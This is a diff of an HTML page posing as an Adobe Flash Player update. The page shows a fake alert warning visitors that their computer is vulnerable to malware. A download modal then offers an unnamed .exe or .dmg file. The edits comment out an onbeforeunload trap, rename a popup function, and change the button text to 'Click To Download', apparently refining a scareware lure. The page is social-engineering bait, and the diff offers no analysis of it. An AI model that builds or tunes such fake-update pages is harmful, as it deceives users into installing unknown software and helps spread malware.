@@ -27,19 +27,19 @@
 	  alert("WARNING! Current version might be outdated!  Your computer is vulnerable to malware.  Install the latest version now.");
     };
 
-    window.onbeforeunload = function()
-    {
-      return "";
-    };
+   // window.onbeforeunload = function()
+   // {
+   //   return "";
+   // };
   </script>
 
 
 
 </head>
 
-<body onunload="exitPopUp()">
+<body onunload="hidePopup()">
 
-  
+ 
 
  
 
@@ -215,7 +215,7 @@ Install your Adobe Flash Player now</p>
           <div class="modal-cr">
             <div class="col1">
                 <h3>Step 1</h3>
-                <h4>Click</h4>
+                <h4>Click To Download</h4>
                 <h5>file<span class="win" style="display: none;">.exe</span><span class="mac" style="display: none;">.dmg</span></h5>
                  <div id="loadingcr" style="display: block;"></div>
             </div>
